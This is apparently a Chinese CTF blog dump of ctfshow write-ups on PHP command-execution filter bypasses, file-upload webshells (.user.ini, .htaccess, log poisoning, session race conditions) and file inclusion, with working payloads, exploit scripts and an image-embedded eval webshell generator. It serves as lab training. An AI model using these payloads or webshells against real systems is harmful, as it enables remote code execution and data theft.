最后一个字符为a$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.??? // 长度为66其中的$&#123;#&#125;也可以省略，只不过不知道为啥本地不行$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???\n\n给出源代码，nnd SHLVL、~和USER都给我ban了\n&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#x27;code&#x27;]))&#123;    $code=$_POST[&#x27;code&#x27;];    if(!preg_match(&#x27;/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|\\%|\\&lt;|\\&gt;|\\&#x27;|\\&quot;|\\`|\\||\\,/&#x27;, $code))&#123;            if(strlen($code)&gt;65)&#123;            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;        &#125;        else&#123;        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;        &#125;    &#125;    else&#123;     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;    &#125;&#125;?&gt;\n继续学习bash内置变量的trick\n$&#123;#&#125;为添加到shell的参数个数，$&#123;##&#125;则为值 空输出的话就是1我们这次因为能用到的内置变量就是 $PWD -&gt; /var/www/html所以这次构造取反读取命令 rev$&#123;#IFS&#125;在ubuntu等系统中值为3所以/bin/rev为$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;?? ????.???\n\nfuzz\nPWD、#、也被ban了，但是HOME没有被禁\n&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#x27;code&#x27;]))&#123;    $code=$_POST[&#x27;code&#x27;];    if(!preg_match(&#x27;/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|#|%|\\&gt;|\\&#x27;|\\&quot;|\\`|\\||\\,/&#x27;, $code))&#123;            if(strlen($code)&gt;65)&#123;            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;        &#125;        else&#123;        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;        &#125;    &#125;    else&#123;     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;    &#125;&#125;?&gt;\n这次我们换另一个命令/bin/base64\n对于/的截取，这里引入$?内置变量\n$? 最后运行的命令的结束代码（返回值）即执行上一个指令的返回值 (显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误)&quot;OS error code   1:  Operation not permitted&quot;&quot;OS error code   2:  No such file or directory&quot;&quot;OS error code   3:  No such process&quot;&quot;OS error code   4:  Interrupted system call&quot;&quot;OS error code   5:  Input/output error&quot;&quot;OS error code   6:  No such device or address&quot;&quot;OS error code   7:  Argument list too long&quot;&quot;OS error code   8:  Exec format error&quot;&quot;OS error code   9:  Bad file descriptor&quot;&quot;OS error code  10:  No child processes&quot;\n输入&lt;A即可返回状态码1\n// 于是截取/可以通过- $&#123;HOME::$?&#125;// 接着利用通配符匹配bin 和 base- $&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;????// 对于数字64，根据题目的提示fuzz,可以采用$&#123;RANDOM&#125;爆破出64来// 当然直接爆破出数字64几率很小，但是爆破出开头为4的数字还是可以的&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???\n我傻了，最后结果应该是base64编码，怎么可能会出现ctfshow。。。\n# coding=gbkimport requestsurl = &quot;http://7b9783ec-5114-4084-b863-8d1ff2a7f333.challenge.ctf.show/&quot;payload = r&quot;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???&quot;data = &#123;    &quot;code&quot;: payload &#125;while True:    r = requests.post(url, data=data)    if &quot;PD9waHA&quot; in r.text: \t\t\t\t\t\t\t\t\t\t\t\t# &lt;?php        print(r.text)        break    print(r.status_code)\n\nRCE\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: 收集自网络# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-06 14:04:45*/error_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#x27;c&#x27;]))&#123;    show_source(__FILE__);&#125;else&#123;    //例子 c=20-1    $content = $_GET[&#x27;c&#x27;];    if (strlen($content) &gt;= 80) &#123;        die(&quot;太长了不会算&quot;);    &#125;    $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;];    foreach ($blacklist as $blackitem) &#123;        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123;  // /m可以匹配&#x27;\\n&#x27;            die(&quot;请不要输入奇奇怪怪的字符&quot;);        &#125;    &#125;    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp    $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];    preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs);  // 结果排序为$matches[0]保存完整模式的所有匹配, $matches[1] 保存第一个子组的所有匹配    foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $whitelist)) &#123;            die(&quot;请不要输入奇奇怪怪的函数&quot;);        &#125;    &#125;    //帮你算出答案    eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);&#125;\n限制一：长度不超过80；\n限制二：黑名单&#39; &#39;, &#39;\\t&#39;, &#39;\\r&#39;, &#39;\\n&#39;,&#39;\\&#39;&#39;, &#39;&quot;&#39;, &#39;‘, ‘\\[‘, ‘\\]‘\n限制三：白名单\n$whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];\n我们需要充分利用白名单中的函数来构造出我们想用的函数。用法有两种：1. 可以当作变量名 2. 可以用作中间转换函数\n这里用到了base_convert\n任意进制之间转换数字base_convert(number,frombase,tobase)返回一个字符串，包含 number 以 tobase 进制的表示。number 本身的进制由 frombase 指定。frombase 和 tobase 都只能在 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。\n重点在于，高于十进制的数字用字母a-z表示，那么我们是否可以借此来搞一些命令执行函数出来。\nsystem 最大字母排在24 也就是我们可以选择一个&gt;25进制作为frombase比如 base_convert(&quot;system&quot;, 36, 10) =&gt; 1751504350那么 base_convert(1751504350, 10, 36) =&gt; system 并且可以绕过引号的过滤接下来利用php函数名可以作为函数的特性c=$ip=base_convert,$ip(1751504350, 10, 36)     // echo 之间可以通过逗号连接\n\n\n接下来就是考虑system参数如何传的问题，我们在这里可以通过两种方式：通过文件头传入命令参数，而文件头信息的获取去搭配getallheaders()，回传一个数组。数组的索引采取键值对的方式\n首先是构造getallheaders关键词base_convert(8768397090111664438, 10, 30)然后就是组合c=$pi=base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)  //小心空格1作为文件头参数传入命令执行语句，同时绕过白名单ctfshow&#123;7764f3d0-696a-47e0-976b-8545d04e9c73&#125;\n或者通过GET/POST传参方式，在参数点需要构造一个$_GET[]，不过还要涉及多个进制转换\n构造 $_GET[a]($_GET[b])  =&gt; a=system&amp;b=ls在线进制转换：https://tool.lu/hexconvert/hex2bin的10进制为37907361743dechex的作用是十进制转换为十六进制_GET转16进制再转10进制的值为1598506324hex2bin把十六进制的字符串转换为ASCII码 用pi当变量的原因是pi在白名单中，变量名只要在白名单中都可以，后面的sin和cos也是一样的=&gt; hex2bin(dechex(1598506324)) =&gt; _GET=&gt; $pi=_GET $$pi&#123;sin&#125; =&gt; $_GET&#123;sin&#125;($_GET[cos])c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;sin&#125;($$pi&#123;cos&#125;)&amp;sin=system&amp;cos=tac flag.php\n总结\n绕过空格\n$&#123;IFS&#125; 但不能写作 $IFS$IFS$9%09&lt;&gt;&lt;$IFS%09\n\n命令执行函数\nsystem : 执行外部程序，并且显示输出，如果 PHP 运行在服务器模块中， system() 函数还会尝试在每行输出完毕之后， 自动刷新 web 服务器的输出缓存。如果要获取一个命令未经任何处理的 原始输出， 请使用 passthru() 函数。exec ： 执行一个外部程序,回显最后一行,需要用echo输出。shell_exec ： 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。popen ： 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。proc_open ： 执行一个命令，并且打开用来输入/输出的文件指针。passthru ： 执行外部程序并且显示原始输出。同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image/gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。pcntl_exec() ： 在当前进程空间执行指定程序，当发生错误时返回 false ，没有错误时没有返回。 `（反引号）：同 shell_exec() 可回显 system passthru echo配合\n\n同cat的查看文件\nmore:一页一页的显示档案内容less:与 more 类似 head:查看头几行tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示tail:查看尾几行nl：显示的时候，顺便输出行号od:以二进制的方式读取档案内容vi:一种编辑器，这个也可以查看vim:一种编辑器，这个也可以查看sort:可以查看uniq:可以查看 file -f:报错出具体内容strings: find the printable strings in a object, or other binary, file\n\n遍历目录的函数\ngetallheaders()：返回所有的HTTP头信息，返回的是数组而eval要求为字符串，所以要用implode()函数将数组转换为字符串get_defined_vars()：该函数的作用是获取所有的已定义变量，返回值也是数组，不过是二维数组，用var_dump()输出可以看见输出的内容，看见在第几位之后，可以用current()函数来获取其值，详细可以看官方函数。payload：var_dump(current(get_defined_vars()));session_id()：session_id()可以用来获取/设置当前会话 ID，可以用这个函数来获取cookie中的phpsessionid，并且这个值我们是可控的。    如可以在cookie中设置 PHPSESSID=706870696e666f28293b，然后用hex2bin()函数，    即传入?exp=eval(hex2bin(session_id(session_start())));         并设置cookie：PHPSESSID=706870696e666f28293b    session_start 函数是为了开启session    配合使用的函数：\tprint_r(scandir(‘.’)); 查看当前目录下的所有文件名  var_dump()\tlocaleconv() 函数返回一包含本地数字及货币格式信息的数组。\tcurrent() 函数返回数组中的当前元素（单元）,默认取第一个值，pos是current的别名\teach() 返回数组中当前的键/值对并将数组指针向前移动一步\tend() 将数组的内部指针指向最后一个单元\tnext() 将数组中的内部指针向前移动一位\tprev() 将数组中的内部指针倒回一位\tarray_reverse() 以相反的元素顺序返回数组\n\n输入输出\n2&gt;/dev/null   把错误输出到空设备（即丢弃）&gt;/dev/null 2&gt;&amp;1   相当于1&gt;/dev/null 2&gt;&amp;1   即把标准输出丢弃，并且把错误输出输出到标准输出。合计起来就是错误和标准输出都输出到空设备2&gt;&amp;1 &gt;/dev/null   错误输出到标准输出，即输出到屏幕上，而标准输出被丢弃something interesting: 重定向&gt; 和 &gt;&gt;   前者会先清空文件，然后再写入内容，后者会将重定向的内容追加到现有文件的尾部.\n\nshell中的整数运算$(())\n$(()) 代表做一次运算，因为里面为空，也表示值为0$((~$(()))) 对0作取反运算，值为-1$(($((~$(())))$((~$(()))))) -1-1，也就是(-1)+(-1)为-2，所以值为-2$((~$(($((~$(())))$((~$(()))))))) 再对-2做一次取反得到1，所以值为1如果对取反不了解可以百度一下，这里给个容易记得式子，如果对a按位取反，则得到的结果为-(a+1)，也就是对0取反得到-1\n\nPHP读取文件的函数\n常用读文件函数highlight_file($filename);show_source($filename);print_r(php_strip_whitespace($filename));print_r(file_get_contents($filename));readfile($filename);// file — 把整个文件读入一个数组中print_r(file($filename)); var_dump(file($filename));include($filename); // 非php代码include_once($filename); // 非php代码require($filename); // 非php代码require_once($filename); // 非php代码// fopen去读取文件内容fread(fopen($filename,&quot;r&quot;), $size);print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));print_r(fgets(fopen($filename, &quot;r&quot;))); // 读取一行fpassthru(fopen($filename, &quot;r&quot;)); // 从当前位置一直读取到 EOFprint_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));print_r(fgetss(fopen($filename, &quot;r&quot;))); // 从文件指针中读取一行并过滤掉 HTML 标记print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);print_r($line);&#125;c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fread($a,&quot;1000&quot;);\n\n\n","tags":["ctfshow"]},{"title":"CTFSHOW-文件上传","url":"/2022/09/08/CTF-SHOW%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","content":"\n前台校验\n\n\n\n前段代码有限制文件后缀为png文件，抓包修改即可，里面写一句话木马\n\n\n后端不能单一校验\n这关应该就是前段验证后缀+后端验证Content-Type，思路和上一关一致\n\n后端不能单一校验\n沿用上一关思路，会出现文件上传失败，失败原因：文件类型不合规\n这一关考察上传.user.ini文件绕过\n使用前提：因为.user.ini只对他同一目录下的文件起作用，也就是说，只有他同目录下有php文件才可以\nupload/index.php存在，那么就可以利用.user.ini文件包含一个一句话木马\n.user.iniauto_prepend_file=1.png\n\n\n &lt;img src=&quot;./CTF-SHOW 文件上传做题记录/image-20220904105848600.png&quot; alt=&quot;image-20220904105848600&quot; style=&quot;zoom:50%;&quot; /&gt;\n\n &lt;img src=&quot;./CTF-SHOW 文件上传做题记录/image-20220904105958782.png&quot; alt=&quot;image-20220904105958782&quot; style=&quot;zoom:50%;&quot; /&gt;\n\n后端不能单二校验\n这一关检测的是上传文件内容中不能包含&lt;(.*)php\n所以更换简约的php标签\n1. 条件：short_open_tags=on&lt;? xxx ?&gt;2. 无条件&lt;?= xxx ?&gt;3. 条件： 开启配置参数asp_tags=on 且php版本 &lt; 7.0 &lt;% xxx %&gt;4. 条件：php版本 &lt; 7.0&lt;script language=&quot;php&quot;&gt;xxx&lt;/script&gt;\n不过依然会检验php后缀，所以还是得上传一个.user.ini\n\n后端不能单三校验\n可以继续打\n\n后端不能单四校验\n这关对[]有过滤，这里可以利用&#123;&#125;来绕过\n\n\n后端不能单五校验\n过滤了{}和分号\n我们已经知道了flag.php的位置在../flag.php所以直接输出\n&lt;?= system(&#x27;more ../fl*&#x27;) ?&gt;\n\n同理\n\n后端不能单六校验\n过滤了括号，直接用反引号执行系统命令\n&lt;?= `more ../fla*` ?&gt;\n\n日志包含\n过滤了括号反引号还有一些关键字\n这一关我们不再能直接去上传一个内容中包含恶意代码的文件了，因为过滤的太多。思路转变为在日志中被动写入恶意代码。我们在一些请求头中携带的参数都会出现在日志当中，而后端并未对着一部分的内容作校验，所以可以实现绕过。那么如何能在upload目录下得到日志文件的内容呢？继续用.user.ini的作用包含日志文件的内容。\n题目的中间件平台为nginx服务器，所以日志文件为/var/log/nginx/access.log，而log关键字被过滤了，我们采用字符串拼接的方式来绕过\n&lt;?=include&quot;/va&quot;.&quot;r/lo&quot;.&quot;g/ngi&quot;.&quot;nx/a&quot;.&quot;ccess&quot;.&quot;.l&quot;.&quot;og&quot;?&gt;空格也过滤啦！！&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;\n\n\n\n\n\n增加了文件头检查\n在上一关的基础上加入文件头\n\n\n\n\n\nsession文件包含\nhttps://www.freebuf.com/vuls/202819.html\n总结一下利用条件：\n\n需要已知session文件存储路径，且内容可控（这一部分主要靠php的配置 + cookie）\n需要存在功能点来包含session文件的内容到可以访问的文件\n有文件上传时才会出现session文件\n\n对于条件一，我们参考链接的思路；对于条件二，利用.usr.ini文件配合；对于条件三自然不必说\n首先上传.user.ini来将session文件内容包含到/upload/index.php中\n超了，这关把.也给过滤了，或者直接对session文件进行包含也可以\n\n\n\n\n贴一下学习的exp，主要是多线程和文件上传的运用\n# coding=gbkimport requestsimport threadingsession = requests.session()url1 = &quot;http://dab9b049-0090-4749-b143-e54abfc39e80.challenge.ctf.show/upload.php&quot;url2 = &quot;http://dab9b049-0090-4749-b143-e54abfc39e80.challenge.ctf.show/upload/index.php&quot;data = &#123;    &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;&#125;file = &#123;    &#x27;file&#x27;:&#x27;racerz&#x27;&#125;cookies = &#123;    &quot;PHPSESSID&quot;:&quot;racerz&quot;&#125;def write():    while True:        r = session.post(url1, data=data, files=file, cookies=cookies)def read():    while True:        r = session.get(url2)        print(r.text)        if &quot;flag&quot; in r.text:            print(r.text)            breakthreads = [threading.Thread(target=write),threading.Thread(target=read)]for i in range(30):    threading.Thread(target=write).start()for i in range(30):    threading.Thread(target=read).start()\n\n线程数要开的大一点\n\n这一关其实和大多数wp描述的不同。首先限制了访问流量，导致无法通过条件竞争的方式来将session文件包含。这里采取了.user.ini文件上传+远程文件包含的方式。我在include中请求一个远程的服务器地址，而回显的结果如果包含php代码的话则会在本地去执行。\n\n首先针对ip的绕过，一般的ip地址是以点号分割的，而我们这关已经把点号给过滤了。但是可以将其转换成整数的形式https://www.bejson.com/convert/ip2int/\n\n\n针对返回php代码，这里起一个flask服务，返回php代码\n\n\n\n\n\npng二次渲染\nhttps://www.fujieace.com/penetration-test/upload-labs-pass-16.html\n原理：在图片中的可允许修改部分添加恶意代码（具体依据不同图片格式的结构），最后重新计算CRC校验并修改\n直接脚本小子\n&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,           0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;    $r = $p[$y];    $g = $p[$y+1];    $b = $p[$y+2];    $color = imagecolorallocate($img, $r, $g, $b);    imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,&#x27;/Users/racerz/Desktop/2.png&#x27;);?&gt;\n\n\n\n\n\njpg二次渲染\n\ncaused by PHP functions imagecopyresized() and imagecopyresampled().\n\n\n&lt;?php$miniPayload = &#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;;if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123;    die(&#x27;php-gd is not installed&#x27;);&#125;if(!isset($argv[1])) &#123;    die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;);&#125;set_error_handler(&quot;custom_error_handler&quot;);for($pad = 0; $pad &lt; 1024; $pad++) &#123;    $nullbytePayloadSize = $pad;    $dis = new DataInputStream($argv[1]);    $outStream = file_get_contents($argv[1]);    $extraBytes = 0;    $correctImage = TRUE;    if($dis-&gt;readShort() != 0xFFD8) &#123;        die(&#x27;Incorrect SOI marker&#x27;);    &#125;    while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;        $marker = $dis-&gt;readByte();        $size = $dis-&gt;readShort() - 2;        $dis-&gt;skip($size);        if($marker === 0xDA) &#123;            $startPos = $dis-&gt;seek();            $outStreamTmp =                substr($outStream, 0, $startPos) .                $miniPayload .                str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) .                substr($outStream, $startPos);            checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE);            if($extraBytes !== 0) &#123;                while((!$dis-&gt;eof())) &#123;                    if($dis-&gt;readByte() === 0xFF) &#123;                        if($dis-&gt;readByte !== 0x00) &#123;                            break;                        &#125;                    &#125;                &#125;                $stopPos = $dis-&gt;seek() - 2;                $imageStreamSize = $stopPos - $startPos;                $outStream =                    substr($outStream, 0, $startPos) .                    $miniPayload .                    substr(                        str_repeat(&quot;\\0&quot;,$nullbytePayloadSize).                        substr($outStream, $startPos, $imageStreamSize),                        0,                        $nullbytePayloadSize+$imageStreamSize-$extraBytes) .                    substr($outStream, $stopPos);            &#125; elseif($correctImage) &#123;                $outStream = $outStreamTmp;            &#125; else &#123;                break;            &#125;            if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123;                die(&#x27;Success!&#x27;);            &#125; else &#123;                break;            &#125;        &#125;    &#125;&#125;unlink(&#x27;payload_&#x27;.$argv[1]);die(&#x27;Something\\&#x27;s wrong&#x27;);function checkImage($filename, $data, $unlink = FALSE) &#123;    global $correctImage;    file_put_contents($filename, $data);    $correctImage = TRUE;    imagecreatefromjpeg($filename);    if($unlink)        unlink($filename);    return $correctImage;&#125;function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;    global $extraBytes, $correctImage;    $correctImage = FALSE;    if(preg_match(&#x27;/(\\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123;        if(isset($m[1])) &#123;            $extraBytes = (int)$m[1];        &#125;    &#125;&#125;class DataInputStream &#123;    private $binData;    private $order;    private $size;    public function __construct($filename, $order = false, $fromString = false) &#123;        $this-&gt;binData = &#x27;&#x27;;        $this-&gt;order = $order;        if(!$fromString) &#123;            if(!file_exists($filename) || !is_file($filename))                die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;);            $this-&gt;binData = file_get_contents($filename);        &#125; else &#123;            $this-&gt;binData = $filename;        &#125;        $this-&gt;size = strlen($this-&gt;binData);    &#125;    public function seek() &#123;        return ($this-&gt;size - strlen($this-&gt;binData));    &#125;    public function skip($skip) &#123;        $this-&gt;binData = substr($this-&gt;binData, $skip);    &#125;    public function readByte() &#123;        if($this-&gt;eof()) &#123;            die(&#x27;End Of File&#x27;);        &#125;        $byte = substr($this-&gt;binData, 0, 1);        $this-&gt;binData = substr($this-&gt;binData, 1);        return ord($byte);    &#125;    public function readShort() &#123;        if(strlen($this-&gt;binData) &lt; 2) &#123;            die(&#x27;End Of File&#x27;);        &#125;        $short = substr($this-&gt;binData, 0, 2);        $this-&gt;binData = substr($this-&gt;binData, 2);        if($this-&gt;order) &#123;            $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);        &#125; else &#123;            $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);        &#125;        return $short;    &#125;    public function eof() &#123;        return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);    &#125;&#125;?&gt;\n特别说明，脚本生效需要经过二次渲染之后才可进行修改，并且并不是所有的jpg图片都可以成功\n天知道我尝试了多少次….\n\n\nzip文件上传\n\n\n\n但好像是只做了文件类型MIME检验\n那就直接修改包内容类型为application/x-zip-compressed即可\n\n文件上传 httpd\n\n前端有检验只允许上传jpg文件\n根据httpd提示可知这是.htaccess文件中的一个配置，所以直接使用.htaccess文件上传\npayload\n# .htaccess文件配置AddType application/x-httpd-php .jpg# 或者&lt;FilesMatch &quot;jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;\n\n之后上传含有恶意php代码的jpg文件即可\n\n文件上传 基础免杀\n\n这里应该就是针对命令执行语句的过滤吧，如果被过滤了的话就直接访问返回404了\n这题刚开始试不出来，去wp里翻到了源码\n# 对文件类型的处理if($_FILES[&#x27;file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;)&#123;            $str = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);            if(check($str)===0)&#123;                move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &#x27;./upload/&#x27;.$_FILES[&quot;file&quot;][&quot;name&quot;]); // nnd，原来是上传到了upload文件夹里                $ret = array(&quot;code&quot;=&gt;0,&quot;msg&quot;=&gt;$_FILES[&quot;file&quot;][&quot;name&quot;]);&#125;# 对文件内容的处理preg_match(&#x27;/eval|assert|assert|_POST|_GET|_COOKIE|system|shell_exec|include|require/i&#x27;, $str); \n所以其实没啥，没过滤反引号和echo，直接输出就行\n&lt;?php echo `tac ../fl*`; ?&gt;\n\n\n文件上传 高级免杀\n前端限制为zip，后端限制了MIME为png\n\n过滤了&lt;?，沿用日志包含的思路\n先上传.user.ini\nauto_prepend_file=/var/log/nginx/access.log\n\n后上传一个php文件，用来包含日志文件并在访问时解析其中的恶意代码\n\n\n文件上传 终极免杀\n虽说终极，但是和上一题同理\n\n\n","tags":["ctfshow"]},{"title":"CTFSHOW-文件包含","url":"/2022/09/23/CTF-SHOW%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","content":"php中提供的文件包含函数\n- include：找不到被包含的文件时只会产生警告，脚本将继续执行。- include_once：和include()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。- require：找不到被包含的文件时会产生致命错误，并停止脚本。- require_once：和require()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。\n\n\n由于支持多种协议，所以也就为文件包含带来了多种攻击姿势\n\nweb78.  文件包含系列开始\n题面如下，考查最基本的php伪协议\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 10:52:43# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 10:54:20# @email: h1xa@ctfer.com# 